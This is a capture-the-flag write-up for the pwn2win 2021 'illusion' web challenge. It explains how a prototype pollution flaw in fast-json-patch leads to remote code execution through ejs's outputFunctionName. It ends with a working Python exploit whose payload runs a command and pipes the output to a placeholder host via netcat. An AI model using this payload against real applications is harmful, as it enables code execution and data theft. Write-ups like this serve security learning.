---
title: illusion - pwn2win 2021
date: 2021-06-03 18:32:20
author: Sayooj B Kumar
author_url: https://twitter.com/_1nt3rc3pt0r_
categories:
 - Web Exploitation
tags:
 - RCE
 - Prototype pollution
---

**tl;dr**

+ Using Prototype pollution vulnerablity in fast-json-patch pollute value in outputFunctionName 
+ Get a shell as the flag can only be obtained using binary file 

<!--more-->

**No. Of Solves:** 78

**Challenge points:** 151

**Solved By:** [1nt3rc3pt0r](https://twitter.com/_1nt3rc3pt0r_), [Captain-Kay](https://twitter.com/captainkay11)

## Challenge Description

Laura just found a website used for monitoring security mechanisms on Rhiza's state and is planning to hack into it to forge the status of these security services. After that she will desactivate these security resources without alerting government agents. Your goal is to get into the server to change the monitoring service behavior.

**Source Code:** [here](source-code.zip)

## Analysis

We have a list of service and status in `index.js`.

```
let services = {
    status: "online",
    cameras: "online",
    doors: "online",
    dome: "online",
    turrets: "online"
   }
   app.use("/static", express.static(__dirname + "/static"));
   app.get("/", async (req, res) => {
       const html = await ejs.renderFile(__dirname + "/templates/index.ejs", {services})
       res.end(html)
   })
```

End point `/change_status` is used to update status of services , this is done with the help of package called `fast-json-patch`. 

```
app.post("/change_status", (req, res) => {
    console.log("changing status")
    let patch = []
    console.log(req.body);
    Object.entries(req.body).forEach(([service, status]) => {

        if (service === "status"){
            res.status(400).end("Cannot change all services status")
            return
        }

        patch.push({
            "op": "replace",
            "path": "/" + service,
            "value": status
        })
    });
```

`fast-json-patch` initially had vulnerablity regarding *Prototype pollution* and it was said to be fixed in the current version that we use in challenge.

```
if (banPrototypeModifications && key == '__proto__') {
                throw new TypeError('JSON-Patch: modifying `__proto__` prop is banned for security reasons, if this was on purpose, please set `banPrototypeModifications` flag false and pass it to this function. More info in fast-json-patch README');
            }
```

The Patch was not good enough to prevent Prototype pollution as they check for existance of `__proto__` there still exists a chance for Prototype pollution using `prototype` [Check Here](https://github.com/Starcounter-Jack/JSON-Patch/pull/262)



## Solution

Now we can overwrite values as we need  using `constructor/prototype/<variable>`.

### RCE using Prototype pollution

we have ejs as template engine and injecting code to `outputFunctionName` in `ejs.js` can lead to RCE [Check Here](https://github.com/mde/ejs/issues/451) 


```
      if (opts.outputFunctionName) {
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
      }
```
## Exploit Script

```
import requests

TARGET_URL = 'http://illusion.pwn2win.party:23121'
head={"Authorization":"Basic YWRtaW46cWpoeXFwZWJ4ZW12dnF1cg=="}// change

r=requests.post(TARGET_URL + '/change_status',json={"constructor/prototype/outputFunctionName":"a; return process.mainModule.require('child_process').execSync('./readflag|nc <ip> <port>'); //"},headers=head)
print(r.text)

r=requests.get(TARGET_URL,headers=head)
print(r.text)

```

## Flag

```
CTF-BR{d0nt_miX_pr0totyPe_pol1ution_w1th_a_t3mplat3_3ng1nE!}
```







 


